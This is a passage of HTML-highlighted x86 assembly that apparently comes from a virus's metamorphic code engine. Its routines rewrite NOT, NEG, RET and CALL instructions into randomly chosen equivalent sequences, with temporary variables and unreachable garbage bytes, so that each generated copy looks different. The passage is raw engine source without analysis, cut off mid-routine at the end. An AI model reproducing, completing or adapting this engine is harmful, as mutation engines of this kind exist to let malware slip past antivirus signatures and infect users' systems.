                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc5">@@MOV_Finished</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; Set ADD as operation from</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; now</span><span class="sc0">
       </span><span class="sc5">@@MOV_Finished2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the index1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                   </span><span class="sc1">; If it's not no_reg, then</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@MOV_Other</span><span class="sc0">                </span><span class="sc1">; it's not finished</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the index2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                   </span><span class="sc1">; no_reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@MOV_Other</span><span class="sc0">                </span><span class="sc1">; If not, continue</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Addition</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; Check if addition is 0</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@MOV_Other</span><span class="sc0">                </span><span class="sc1">; If not, continue</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_RestoreOperation</span><span class="sc0"> </span><span class="sc1">; We finish when both indexes are</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                         </span><span class="sc1">; 8 and the addition is 0</span><span class="sc0">
   </span><span class="sc5">@@Addition1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set 8 as Index1 and put ADD</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MOV_Finished</span><span class="sc0">             </span><span class="sc1">; to make it directly</span><span class="sc0">
   </span><span class="sc5">@@Addition2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Mem_Index2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set 8 as Index2 and start</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MOV_Finished</span><span class="sc0">            </span><span class="sc1">; with ADD instead as with MOV</span><span class="sc0">
</span><span class="sc5">Xp_GenLEA</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Generate a NOT Reg</span><span class="sc0">
</span><span class="sc5">Xp_GenNOTReg</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; Generate a complex NOT with</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">                </span><span class="sc1">; a prob. of 1/4</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenNEGReg</span><span class="sc0">          </span><span class="sc1">; Generate a NEG</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; And now generate an ADD Reg,-1</span><span class="sc0">
</span><span class="sc5">Xp_GenNOTReg_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegImm</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0">

    </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Generate directly the NOT</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NOT32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E2h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NOT_</span><span class="sc0">
      </span><span class="sc5">@@NOT32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc0">
      </span><span class="sc5">@@NOT_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">Xp_GenNOTReg_Common_Direct</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Construct the NOT/NEG instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
</span><span class="sc5">Xp_GenNOTReg</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Generate a NEG Reg instruction or group of instructions that do the same</span><span class="sc0">
</span><span class="sc5">Xp_GenNEGReg</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenNOTReg</span><span class="sc0">        </span><span class="sc1">; Make a NOT Reg + ADD Reg,1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_GenNOTReg_Common</span><span class="sc0">

   </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NEG32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E6h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_GenNOTReg_Common_Direct</span><span class="sc0">
      </span><span class="sc5">@@NEG32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E4h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_GenNOTReg_Common_Direct</span><span class="sc0">
</span><span class="sc5">Xp_GenNEGReg</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;; Generate a NOT Mem</span><span class="sc0">
</span><span class="sc5">Xp_GenNOTMem</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
                                         </span><span class="sc1">; Complex:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenNEGMem</span><span class="sc0">     </span><span class="sc1">; Generate a NEG Mem + ADD Mem,-1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">Xp_GenNOTMem_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemImm</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0">

   </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NOT32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E3h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NOT_</span><span class="sc0">
      </span><span class="sc5">@@NOT32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E1h</span><span class="sc0">
      </span><span class="sc5">@@NOT_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">Xp_GenNOTMem_Common_Direct</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Construct the NOT/NEG Mem instrc.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_CopyMemoryReference</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
</span><span class="sc5">Xp_GenNOTMem</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Generate a NEG Mem</span><span class="sc0">
</span><span class="sc5">Xp_GenNEGMem</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
                                         </span><span class="sc1">; Complex:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenNOTMem</span><span class="sc0">     </span><span class="sc1">; Make NOT Mem + ADD Mem,1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_GenNOTMem_Common</span><span class="sc0">

   </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NEG32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E7h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_GenNOTMem_Common_Direct</span><span class="sc0">
      </span><span class="sc5">@@NEG32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E5h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_GenNOTMem_Common_Direct</span><span class="sc0">
</span><span class="sc5">Xp_GenNEGMem</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Generate a RET operation</span><span class="sc0">
</span><span class="sc5">Xp_GenRET</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">        </span><span class="sc1">; Put it directly with a prob. of 1/4</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GetTempVar</span><span class="sc0">        </span><span class="sc1">; Allocate a temporary variable</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPOPMem</span><span class="sc0">         </span><span class="sc1">; Make a POP [TempVar]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenJMPMem</span><span class="sc0">         </span><span class="sc1">; Make a JMP [TempVar]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0">
     </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">            </span><span class="sc1">; Code the RET directly and</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; generate some not-reachable</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">             </span><span class="sc1">; garbage.</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
</span><span class="sc5">Xp_GenRET</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Generate a CALL Reg</span><span class="sc0">
</span><span class="sc5">Xp_GenCALLReg</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">             </span><span class="sc1">; Make it complex with a prob. of</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; 1/4</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GetTempVar</span><span class="sc0">      </span><span class="sc1">; Let's make MOV [TempVar],Reg +</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">           </span><span class="sc1">; + CALL [TempVar]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPMemReg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenCALLMem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_RestoreOpAndDecreaseRecurseLevel</span><span class="sc0">
   </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ECh</span><span class="sc0">          </span><span class="sc1">; Code the CALL directly</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_DecreaseRecurseLevel</span><span class="sc0">
</span><span class="sc5">Xp_GenCALLReg</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Generate a CALL Mem (used for API calls, so EAX, ECX and EDX regs. are free</span><span class="sc0">
</span><span class="sc1">;; for use).</span><span class="sc0">
</span><span class="sc5">Xp_GenCALLMem</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_IncreaseRecurseLevel</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single</span><span class="sc0">      </span><span class="sc1">; Make it complex with a prob. of 1/2</span><span class="sc0">
   </span><span class="sc5">@@Multiple</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Multiple_Reg</span><span class="sc0">   </span><span class="sc1">; Here we can use EAX,ECX or EDX</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_SaveOperation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPUSHMem</span><span class="sc0">   </span><span class="sc1">; Make PUSH [Mem]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GetTempVar</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenPOPMem</span><span class="sc0">    </span><span class="sc1">; Make POP [TempVar]</span><span class="sc0">
